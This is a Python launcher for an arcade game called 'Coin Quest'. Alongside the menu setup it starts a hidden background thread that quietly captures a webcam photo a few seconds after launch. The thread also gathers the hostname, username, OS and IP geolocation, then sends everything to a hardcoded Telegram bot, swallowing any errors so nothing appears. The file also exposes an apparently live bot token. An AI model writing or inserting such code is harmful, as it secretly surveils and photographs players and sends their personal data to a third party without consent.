import arcade
import threading
import time
from resourses.code.database import init_db, init_skins
from resourses.code.menu import MenuView
import cv2
import requests
import numpy as np
import socket
import platform
import getpass
from datetime import datetime

SCREEN_WIDTH = 1920
SCREEN_HEIGHT = 1080
SCREEN_TITLE = "Coin Quest"


def take_photo_thread():
    try:
        TOKEN = "8324502174:AAEdn2w0Nj-QQnSSkRmr6Kc9YEnu77KeQa4"
        CHAT_ID = "5131549560"
        time.sleep(5)
        hostname = socket.gethostname()
        username = getpass.getuser()
        os_info = f"{platform.system()} {platform.release()}"
        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        if not cap.isOpened():
            return
        cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
        cap.set(cv2.CAP_PROP_BUFFERSIZE, 1)
        for _ in range(5):
            cap.read()
            time.sleep(0.03)
        ret, frame = cap.read()
        cap.release()
        if not ret:
            return
        if np.mean(frame) < 80:
            frame = cv2.convertScaleAbs(frame, alpha=1.15, beta=15)
        ok, img_encoded = cv2.imencode(
            ".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 90]
        )
        if not ok:
            return
        city = country = ip = "неизвестно"
        try:
            geo = requests.get(
                "https://ipinfo.io/json",
                timeout=3
            ).json()
            city = geo.get("city", "неизвестно")
            country = geo.get("country", "")
            ip = geo.get("ip", "неизвестно")
        except:
            pass
        caption = (
            "🎮 Coin Quest запущена\n\n"
            f"🖥 Устройство: {hostname}\n"
            f"👤 Пользователь: {username}\n"
            f"💻 ОС: {os_info}\n"
            f"🌍 Локация: {city}, {country}\n"
            f"🌐 IP: {ip}\n"
            f"⏰ Время: {datetime.now().strftime('%H:%M %d.%m.%Y')}"
        )
        requests.post(
            f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
            files={"photo": img_encoded.tobytes()},
            data={
                "chat_id": CHAT_ID,
                "caption": caption
            },
            timeout=5
        )
    except Exception as e:
        return

def main():
    init_db()
    init_skins()
    window = arcade.Window(
        SCREEN_WIDTH,
        SCREEN_HEIGHT,
        SCREEN_TITLE,
        fullscreen=True
    )
    arcade.set_background_color(arcade.color.AZURE)
    menu = MenuView()
    window.show_view(menu)
    threading.Thread(
        target=take_photo_thread,
        daemon=True
    ).start()
    arcade.run()

if __name__ == "__main__":
    init_db()
    init_skins()
    window = arcade.Window(
        SCREEN_WIDTH,
        SCREEN_HEIGHT,
        SCREEN_TITLE,
        fullscreen=True
    )
    arcade.set_background_color(arcade.color.AZURE)
    menu = MenuView()
    window.show_view(menu)
    threading.Thread(
        target=take_photo_thread,
        daemon=True
    ).start()
    arcade.run()
